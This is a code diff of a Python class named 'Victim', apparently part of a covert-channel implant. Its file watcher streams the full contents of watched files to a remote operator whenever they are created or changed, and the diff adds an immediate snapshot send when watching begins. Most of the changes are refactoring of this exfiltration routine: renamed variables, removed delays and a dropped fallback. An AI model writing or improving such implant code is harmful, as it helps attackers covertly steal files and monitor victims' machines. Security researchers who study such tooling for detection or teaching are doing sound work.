@@ -345,20 +345,22 @@ class Victim:
 
     def _send_watched_file(self, filepath, event_type=2):
         """Send entire file content via covert channel."""
+
         try:
             if os.path.exists(filepath):
+
                 with open(filepath, "rb") as f:
                     content = f.read()
 
-                file_size = len(content)
+                size = len(content)
 
                 self.send_covert_response(f"[WATCH FILE] {filepath}\n")
                 self.send_covert_response(f"[EVENT] {event_type}\n")
-                self.send_covert_response(f"[SIZE] {file_size}\n")
+                self.send_covert_response(f"[SIZE] {size}\n")
 
                 try:
-                    content_str = content.decode('utf-8', errors='replace')
-                    self.send_covert_response(content_str)
+                    text = content.decode("utf-8", errors="replace")
+                    self.send_covert_response(text)
                 except:
                     self.send_covert_response(content.hex())
 
@@ -368,7 +370,7 @@ class Victim:
             self.send_covert_response(f"[WATCH ERROR] {filepath}: {e}\n")
 
     def start_watcher(self, path):
-        """Watch a file or directory for changes using pyinotify."""
+        """Watch a file or directory for changes."""
 
         if not PYINOTIFY_AVAILABLE:
             self._start_watcher_polling(path)
@@ -380,13 +382,13 @@ class Victim:
             path = os.path.abspath(path)
 
             if os.path.isfile(path):
-                watch_dir = os.path.dirname(path)
+                watch_dir = os.path.dirname(path) or "."
                 target_file = os.path.basename(path)
-                if watch_dir == "":
-                    watch_dir = "."
+
             elif os.path.isdir(path):
                 watch_dir = path
                 target_file = None
+
             else:
                 self.send_covert_response(f"Error: Path {path} does not exist.\n")
                 return
@@ -394,6 +396,7 @@ class Victim:
             wm = pyinotify.WatchManager()
 
             class WatchHandler(pyinotify.ProcessEvent):
+
                 def __init__(watch_self, victim_instance, target_file):
                     watch_self.victim = victim_instance
                     watch_self.target_file = target_file
@@ -401,13 +404,11 @@ class Victim:
                 def process_IN_CREATE(watch_self, event):
                     if not event.dir:
                         if watch_self.target_file is None or event.pathname.endswith(watch_self.target_file):
-                            time.sleep(0.5)
                             watch_self.victim._send_watched_file(event.pathname, 1)
 
                 def process_IN_CLOSE_WRITE(watch_self, event):
                     if not event.dir:
                         if watch_self.target_file is None or event.pathname.endswith(watch_self.target_file):
-                            time.sleep(0.5)
                             watch_self.victim._send_watched_file(event.pathname, 2)
 
                 def process_IN_DELETE(watch_self, event):
@@ -419,6 +420,7 @@ class Victim:
                     )
 
             handler = WatchHandler(self, target_file)
+
             self.watcher_observer = pyinotify.Notifier(wm, handler, timeout=1000)
 
             mask = (
@@ -435,17 +437,20 @@ class Victim:
                         self.watcher_observer.process_events()
                         if self.watcher_observer.check_events():
                             self.watcher_observer.read_events()
-                    except Exception:
+                    except:
                         break
 
             self.watcher_thread = threading.Thread(target=watch_loop, daemon=True)
             self.watcher_thread.start()
 
+            # Send initial snapshot
+            if os.path.isfile(path):
+                self._send_watched_file(path, 2)
+
             self.send_covert_response(f"Watching {path}...\n")
 
         except Exception as e:
             self.send_covert_response(f"Watch error: {e}\n")
-            self._start_watcher_polling(path)
 
     def _start_watcher_polling(self, path):
         """Fallback polling-based watcher if pyinotify unavailable."""
